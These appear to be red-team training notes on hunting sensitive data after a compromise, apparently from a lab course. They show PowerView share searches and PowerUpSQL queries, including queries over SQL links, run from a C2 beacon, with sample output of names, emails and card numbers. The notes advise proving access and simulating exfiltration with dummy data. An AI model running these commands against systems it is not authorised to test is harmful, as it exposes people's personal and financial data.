---
description: 11/12/2025
---

# âœ… Data Hunting & Exfiltration

## Introduction

Organizations will store data in a wide variety of places from file shares, database, SharePoint, internal wiki's and so on.

As a red teamer, you will need to find the overall "objective" of your operation and then prove _**access**_ to that objective to your client.

### When Testing on a Real Engagement...

I emphasize "access" specifically, because you do not want to actually copy/move sensitive data of any kind out of its location, particularly in regulated environments.

#### Planning an Engagement

When planning the assessment with your client, a good strategy to suggest is to create a dummy data repository that is subject to all the same security controls but doesn't actually contain any real data (it could be fake or obfuscated data). &#x20;

**That data can be generated by you or the client and would be safe to remove from the environment.**

Otherwise, you can prove access to real data, but carry out an exfiltration exercise with dummy data. &#x20;

It can have the same structure and properties as the real data, but the content itself would not be sensitive.

Exfiltration exercises are an important step to gauge how effectively an organisation can detect and respond to their sensitive data being removed by whatever means (email, HTTP, FTP etc).

## File Shares

`Find-DomainShare` in `PowerView` searches for computer shares on the domain.

**The `-CheckShareAccess` parameter only shows that shares the current user has read access to:**

```
beacon> powershell Find-DomainShare -CheckShareAccess

Name             Type Remark                                      ComputerName             
----             ---- ------                                      ------------             
CertEnroll          0 Active Directory Certificate Services share dc-2.dev.cyberbotic.io   
home$               0                                             dc-2.dev.cyberbotic.io   
NETLOGON            0 Logon server share                          dc-2.dev.cyberbotic.io   
software            0                                             dc-2.dev.cyberbotic.io   
SYSVOL              0 Logon server share                          dc-2.dev.cyberbotic.io   
finance$            0                                             fs.dev.cyberbotic.io
```

**`Find-InterestingDomainShareFile` takes this a step further and searches each share, returning results where the specified strings appear in the path:**

```
beacon> powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*

Owner          : BUILTIN\Administrators
CreationTime   : 9/15/2022 4:22:55 PM
Path           : \\fs.dev.cyberbotic.io\finance$\export.csv
LastAccessTime : 9/15/2022 4:23:21 PM
LastWriteTime  : 9/15/2022 4:22:55 PM
Length         : 8076

beacon> powershell gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

id,first_name,last_name,email,address,postal_code,credit_card
1,Emmery,Sutton,esutton0@blogspot.com,4788 Ronald Regan Drive,,374288148757510
2,Abie,Maffezzoli,amaffezzoli1@dagondesign.com,6897 Butternut Alley,,374288483637400
3,Rosina,Mellows,rmellows2@google.pl,100 Commercial Hill,,374283426936183
4,Glen,Chatwood,gchatwood3@bbc.co.uk,59046 Northview Trail,,374283883423493
```

## Databases

`PowerUpSQL` provides various cmdlets designed for data searching and extraction.

**One such cmdlet is `Get-SQLColumnSampleDataThreaded`, which can search one or more instances for databases that contain particular keywords in the column names:**

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column                   Sample                  
--------                     -------- ------                   ------                  
sql-2.dev.cyberbotic.io,1433 master   email                    ritzhaki0@gov.uk        
sql-2.dev.cyberbotic.io,1433 master   email                    ldureden1@angelfire.com 
sql-2.dev.cyberbotic.io,1433 master   email                    gfaussett2@quantcast.com
sql-2.dev.cyberbotic.io,1433 master   email                    bcrumb3@cpanel.net      
sql-2.dev.cyberbotic.io,1433 master   email                    ldirkin4@123-reg.co.uk  
sql-2.dev.cyberbotic.io,1433 master   address                  5575 8th Plaza          
sql-2.dev.cyberbotic.io,1433 master   address                  759 Schmedeman Avenue   
sql-2.dev.cyberbotic.io,1433 master   address                  077 Menomonie Parkway   
sql-2.dev.cyberbotic.io,1433 master   address                  99 Gerald Street        
sql-2.dev.cyberbotic.io,1433 master   address                  150 Raven Court         
sql-2.dev.cyberbotic.io,1433 master   credit_card              374288069616869         
sql-2.dev.cyberbotic.io,1433 master   credit_card              374288681554928         
sql-2.dev.cyberbotic.io,1433 master   credit_card              374283595554411         
sql-2.dev.cyberbotic.io,1433 master   credit_card              374283532455854         
sql-2.dev.cyberbotic.io,1433 master   credit_card              374288154929482 
```

This can only search the instances you have direct access to; it won't traverse any SQL links.

**To search over the links, we can use the `Get-SQLQuery` option:**

```
 beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          employees             BASE TABLE
master        dbo          spt_values            VIEW      
master        dbo          spt_monitor           BASE TABLE
master        dbo          MSreplication_options BASE TABLE

```

**Note the "employees" table.  Next, list its columns:**

```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

column_name   
-----------   
id            
first_name    
last_name     
gender        
address       
post_code     
sort_code     
account_number
```

**Then finally, take a data sample:**

```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"

first_name gender sort_code
---------- ------ ---------
Juliann    Female 09-46-87 
Rhodie     Female 89-74-73 
Calypso    Female 77-33-04 
Burt       Male   36-84-98 
Gayelord   Male   28-16-45 

```

If this is real data, don't extract multiple columns that can be correlated together. &#x20;

{% hint style="danger" %}
As in this example, take a sample of a column that doesn't really mean anything in isolation.  To simulate data exfiltration of large dataset, have a look at [Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess).
{% endhint %}
